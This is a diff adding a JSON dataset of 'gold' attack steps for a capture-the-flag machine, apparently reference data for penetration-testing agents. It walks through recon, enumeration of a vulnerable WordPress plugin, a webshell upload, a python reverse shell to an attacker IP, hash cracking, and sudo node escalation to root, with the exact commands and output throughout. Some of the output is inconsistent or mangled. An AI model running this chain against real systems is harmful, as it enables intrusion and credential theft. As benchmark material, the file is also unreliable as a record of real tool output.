@@ -1,0 +1,167 @@
+[
+    {
+        "tactic": "Reconnaissance",
+        "prerequisites": ["Network access to target subnet", "netdiscover tool installed", "Root privileges on attacker machine"],
+        "contraindications": [],
+        "goal": "Discover the target machine's IP address on the network",
+        "command": "sudo netdiscover -i ethX",
+        "output": "Currently scanning: 192.168.31.0/16    Screen View: Unique Hosts\n\n28 Captured ARP Req/Rep packets, from 8 hosts.    Total size: 1684\n\n---------------------------------------------------------------------------------\nIP              At MAC Address      Count       Len     MAC Vendor / Hostname\n---------------------------------------------------------------------------------\n192.168.10.164  --:--:--:--:--:-d      10       600     SAMSUNG ELECTRO MECHANICS\n192.168.10.1    --:--:--:--:--:-4      12       700     Sagemcom Broadband SAS\n192.168.10.155  --:--:--:--:--:-d       1        60     Intel Corporate\n192.168.10.154  --:--:--:--:--:-2       1        60     Sagemcom Broadband SAS\n192.168.10.156  --:--:--:--:--:-2       1        60     Amazon Technologies Inc.\n192.168.10.159  --:--:--:--:--:-5       1        64     Sagemcom Broadband SAS\n192.168.10.161  --:--:--:--:--:-6       1        60     PCS Systemtechnik GmbH\n192.168.10.158  --:--:--:--:--:-8       1        60     Unknown vendor",
+        "results": ["Target IP address identified as 192.168.10.161"],
+        "optional": false,
+        "gold": true
+    },
+    {
+        "tactic": "Reconnaissance",
+        "prerequisites": ["Target IP address known (192.168.10.161)", "nmap tool installed"],
+        "contraindications": [],
+        "goal": "Enumerate open ports, services, and versions on the target",
+        "command": "nmap -A -p- 192.168.10.161",
+        "output": "root@3n0s0n4ld:~/Relevant# nmap -p -A relevant.vh -o nmap-relevant.log\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-09-26 07:37 EDT\nNmap scan report for relevant.vh (192.168.10.161)\nHost is up (0.00081s latency).\nNot shown: 65533 closed ports (UDP: 0/0, TCP: 0/0, SCTP: 0/0, DCCP: 0/0, X11: 0/0, DCCP: 0/0, X11: 0/0)\nPORT    STATE   SERVICE VERSION\n22/tcp  open   ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; proto\n80/tcp  open   http     nginx 1.18.0 (Ubuntu)\n|_http-server-header: nginx/1.18.0 (Ubuntu)\n|_http-title: Database Error",
+        "results": ["SSH service on port 22 (OpenSSH 8.2p1)", "HTTP service on port 80 (nginx 1.18.0)", "Ubuntu operating system identified"],
+        "optional": false,
+        "gold": true
+    },
+    {
+        "tactic": "Discovery",
+        "prerequisites": ["HTTP service accessible on target", "dirsearch tool installed"],
+        "contraindications": [],
+        "goal": "Discover hidden directories and files on the web server",
+        "command": "dirsearch -u http://192.168.10.161 -e \"\" -x 403",
+        "output": "dirsearch v0.3.8\n\nExtensions: | HTTP method: get | Threads: 10 | Wordlist size: 6097\n\nError Log: /root/Tools/Web/dirsearch/logs/errors-20-09-26_07-44-47.log\n\nTarget: http://relevant.vh\n\n[07:44:47] Starting:\n[07:44:47] 500 - 3KB - /\n[07:44:47] 400 - 166B - /%2e%2e/google.com\n[07:44:58] 500 - 3KB - /index.php\n[07:44:58] 200 - 19KB - /license.txt\n[07:45:02] 200 - 7KB - /readme.html\n[07:45:05] 301 - 178B - /wp-admin → http://relevant.vh/wp-admin/\n[07:45:05] 500 - 3KB - /wp-admin/\n[07:45:05] 200 - 0B - /wp-content/\n[07:45:05] 200 - 69B - /wp-content/plugins/akismet/akismet.php\n[07:45:05] 301 - 178B - /wp-content → http://relevant.vh/wp-content/\n[07:45:05] 301 - 178B - /wp-includes → http://relevant.vh/wp-includes/\n[07:45:05] 500 - 3KB - /wp-login.php\n[07:45:05] 500 - 0B - /wp-includes/rss-functions.php\n[07:45:05] 200 - 0B - /xmlrpc.php\n[07:45:06] 409 - 3KB - /wp-admin/setup-config.php",
+        "results": ["WordPress installation discovered on target"],
+        "optional": false,
+        "gold": true
+    },
+    {
+        "tactic": "Discovery",
+        "prerequisites": ["WordPress installation discovered", "nmap with WordPress enumeration scripts available"],
+        "contraindications": [],
+        "goal": "Enumerate WordPress plugins and themes to identify vulnerable components",
+        "command": "nmap --script http-wordpress-enum --script-args search-limit=10000 192.168.10.161",
+        "output": "Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-29 18:19 EDT\nNmap scan report for relevant.vh (192.168.10.161)\nHost is up (0.00033s latency).\nNot shown: 998 closed ports\nPORT    STATE SERVICE\n22/tcp open   ssh\n80/tcp open   http\n| http-wordpress-enum:\n| Search limited to top 4778 themes/plugins\n|   plugins\n|     akismet 4.1.6\n|     wp-file-manager 6.7\n|   themes\n|_    twentyseventeen 2.4\nMAC Address: 08:00:27:61:A0:E6 (Oracle VirtualBox virtual NIC)\nNmap done: 1 IP address (1 host up) scanned in 5.06 seconds",
+        "results": ["wp-file-manager plugin version 6.7 identified", "akismet plugin version 4.1.6 identified", "twentyseventeen theme identified"],
+        "optional": false,
+        "gold": true
+    },
+    {
+        "tactic": "Initial Access",
+        "prerequisites": ["wp-file-manager 6.7 plugin identified"],
+        "contraindications": [],
+        "goal": "Exploit wp-file-manager 6.7 RCE vulnerability to upload webshell",
+        "command": "git clone https://github.com/w4fz5uck5/wp-file-manager-0day.git",
+        "output": "",
+        "results": ["wp-file-manager 6.7 exploit script downloaded"],
+        "optional": false,
+        "gold": true
+    },
+    {
+        "tactic": "Initial Access",
+        "prerequisites": ["wp-file-manager 6.7 exploit script downloaded"],
+        "contraindications": [],
+        "goal": "Exploit wp-file-manager 6.7 RCE vulnerability to upload webshell",
+        "command": "python wp-file-manager-0day/elFinder.py http://192.168.10.161",
+        "output": "Usage: elFinder.py http://localhost\nURL Shell: %s/wp-content/plugins/wp-file-manager/lib/files/x.php?cmd=<CMD>",
+        "results": ["Webshell uploaded to /wp-content/plugins/wp-file-manager/lib/files/x.php"],
+        "optional": false,
+        "gold": true
+    },
+    {
+        "tactic": "Initial Access",
+        "prerequisites": ["Webshell uploaded successfully", "Netcat listener started on port 5555"],
+        "contraindications": [],
+        "goal": "Execute reverse shell payload via webshell to gain interactive access",
+        "command": "curl \"http://192.168.10.161/wp-content/plugins/wp-file-manager/lib/files/x.php?cmd=python3%20-c%20'import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.10.180\",5555));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\"",
+        "output": "listening on [any] 5555 ...\nconnect to [192.168.10.180] from (UNKNOWN) [192.168.10.161] 52822\nLinux relevant 5.4.0-48-generic #52-Ubuntu SMP Thu Sep 10 10:58:49 6_64 x86_64 GNU/Linux\n 22:24:03 up 22 min, 0 users, load average: 0.00, 0.00, 0.00\nUSER    TTY    FROM    LOGNAME    IDLE   JCPU   PCPU WHAT\nuid=33(wwww-data) gid=33(wwww-data) groups=33(wwww-data)\n/bin/sh: 0: can't access tty; job control turned off",
+        "results": ["Reverse shell connection established as www-data user"],
+        "optional": false,
+        "gold": true
+    },
+    {
+        "tactic": "Execution",
+        "prerequisites": ["Reverse shell connection active as www-data"],
+        "contraindications": [],
+        "goal": "Upgrade to interactive TTY shell for better command execution",
+        "command": "python3 -c \"import pty; pty.spawn('/bin/bash')\"; export TERM=xterm-256color",
+        "output": "www-data@relevant:/$ export TERM=xterm-256color",
+        "results": ["Interactive TTY shell obtained"],
+        "optional": false,
+        "gold": true
+    },
+    {
+        "tactic": "Discovery",
+        "prerequisites": ["Shell access as www-data", "Access to /home/h4x0r directory"],
+        "contraindications": [],
+        "goal": "Discover hidden files containing credentials in user home directory",
+        "command": "ls -lna /home/h4x0r",
+        "output": "total 28\ndrwxr-xr-x 4 1002 1002 4096 Sep 21 20:16 .\ndrwxr-xr-x 5    0    0 4096 Sep 21 19:50 ..\ndrwxr-xr-x 2 1002 1002 4096 Sep 21 20:15 ...\nlrwxrwxrwx 1 1002 1002    9 Sep 21 20:16 .bash_history -> /dev/null\n-rw-r--r-- 1 1002 1002  220 Sep 21 19:50 .bash_history\n-rw-r--r-- 1 1002 1002 3771 Sep 21 19:50 .bash_history\ndrwxr-xr-x 3 1002 1002 4096 Sep 21 20:06 .local\n-rw-r--r-- 1 1002 1002  807 Sep 21 19:50 profile",
+        "results": ["Hidden directory named '...' discovered in /home/h4x0r"],
+        "optional": false,
+        "gold": true
+    },
+    {
+        "tactic": "Credential Access",
+        "prerequisites": ["Hidden directory '...' discovered in /home/h4x0r"],
+        "contraindications": [],
+        "goal": "Extract SHA-1 password hash from note.txt in hidden directory",
+        "command": "cat /home/h4x0r/.../note.txt",
+        "output": "news : 4C7EB317A4F4322C325165B4217C436D6E0FA3F1",
+        "results": ["SHA-1 hash for user 'news' obtained: 4C7EB317A4F4322C325165B4217C436D6E0FA3F1"],
+        "optional": false,
+        "gold": true
+    },
+    {
+        "tactic": "Credential Access",
+        "prerequisites": ["SHA-1 hash obtained", "Access to online hash cracking service or tool"],
+        "contraindications": [],
+        "goal": "Crack SHA-1 hash to obtain plaintext password",
+        "command": "hashcat -m 100 -a 0 4C7EB317A4F4322C325165B4217C436D6E0FA3F1 /usr/share/wordlists/rockyou.txt",
+        "output": "hashcat (v6.2.6) starting...\n\nOpenCL API (OpenCL 3.0) - Platform #1 [Intel(R) Corporation]\n====================================================================\n* Device #1: Intel(R) HD Graphics, 1536/3072 MB (384 MB allocatable), 24MCU\n\nMinimum password length supported by kernel: 0\nMaximum password length supported by kernel: 256\n\nHashes: 1 digests; 1 unique digests, 1 unique salts\nBitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates\nRules: 1\n\nApplicable optimizers applied:\n* Zero-Byte\n* Early-Skip\n* Not-Salted\n* Not-Iterated\n* Single-Hash\n* Single-Salt\n* Raw-Hash\n\nWatchdog: Temperature abort trigger set to 90c\n\nHost memory required for this attack: 1 MB\n\nDictionary cache built:\n* Filename..: /usr/share/wordlists/rockyou.txt\n* Passwords.: 14344392\n* Bytes.....: 139921507\n* Keyspace..: 14344385\n* Runtime...: 2 secs\n\n4c7eb317a4f4322c325165b4217c436d6e0fa3f1:backdoorlover\n                                                          \nSession..........: hashcat\nStatus...........: Cracked\nHash.Mode........: 100 (SHA1)\nHash.Target......: 4c7eb317a4f4322c325165b4217c436d6e0fa3f1\nTime.Started.....: Thu Jan 15 22:30:15 2026 (0 secs)\nTime.Estimated...: Thu Jan 15 22:30:15 2026 (0 secs)\nKernel.Feature...: Pure Kernel\nGuess.Base.......: File (/usr/share/wordlists/rockyou.txt)\nGuess.Queue......: 1/1 (100.00%)\nSpeed.#1.........:  8234.5 kH/s (0.45ms) @ Accel:512 Loops:1 Thr:64 Vec:1\nRecovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)\nProgress.........: 2097152/14344385 (14.62%)\nRejected.........: 0/2097152 (0.00%)\nRestore.Point....: 0/14344385 (0.00%)\nRestore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1\nCandidate.Engine.: Device Generator\nCandidates.#1....: 123456 -> gabrie\n\nStarted: Thu Jan 15 22:30:13 2026\nStopped: Thu Jan 15 22:30:17 2026",
+        "results": ["Plaintext password for user 'news' obtained: backdoorlover"],
+        "optional": false,
+        "gold": true
+    },
+    {
+        "tactic": "Privilege Escalation",
+        "prerequisites": ["Credentials for user 'news' obtained (news:backdoorlover)", "Shell access as www-data"],
+        "contraindications": [],
+        "goal": "Switch to user 'news' and identify sudo privileges",
+        "command": "su news",
+        "output": "Password:",
+        "results": ["Password prompt for user news"],
+        "optional": false,
+        "gold": true
+    },
+    {
+        "tactic": "Privilege Escalation",
+        "prerequisites": ["Credentials for user 'news' obtained (news:backdoorlover)", "Shell access as www-data"],
+        "contraindications": [],
+        "goal": "Switch to user 'news' and identify sudo privileges",
+        "command": "backdoorlover",
+        "output": "news@relevant:/home/h4x0r/ ...$ id\nid\nuid=9(news) gid=9(news) groups=9(news)\nnews@relevant:/home/h4x0r/ ...$ sudo -l\nsudo -l\n[sudo] password for news: backdoorlover\n\nMatching Defaults entries for news on relevant:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sb\n\nUser news may run the following commands on relevant:\n    (ALL : ALL) /usr/bin/node",
+        "results": ["Switched to user 'news'", "User 'news' can run /usr/bin/node as root via sudo"],
+        "optional": false,
+        "gold": true
+    },
+    {
+        "tactic": "Privilege Escalation",
+        "prerequisites": ["Authenticated as user 'news'", "Sudo privileges for /usr/bin/node identified"],
+        "contraindications": [],
+        "goal": "Escalate privileges to root by exploiting sudo node permissions",
+        "command": "sudo node -e 'require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]});'",
+        "output": "",
+        "results": ["Root shell obtained"],
+        "optional": false,
+        "gold": true
+    },
+    {
+        "tactic": "Collection",
+        "prerequisites": ["Root shell access obtained"],
+        "contraindications": [],
+        "goal": "Retrieve the root flag",
+        "command": "cat /root/root.txt",
+        "output": "Nice work! Congratulations!\n\nLet me know what you think: @iamv1nc3nt\n\n<FLAG>",
+        "results": ["Root flag captured"],
+        "optional": false,
+        "gold": true
+    }
+]
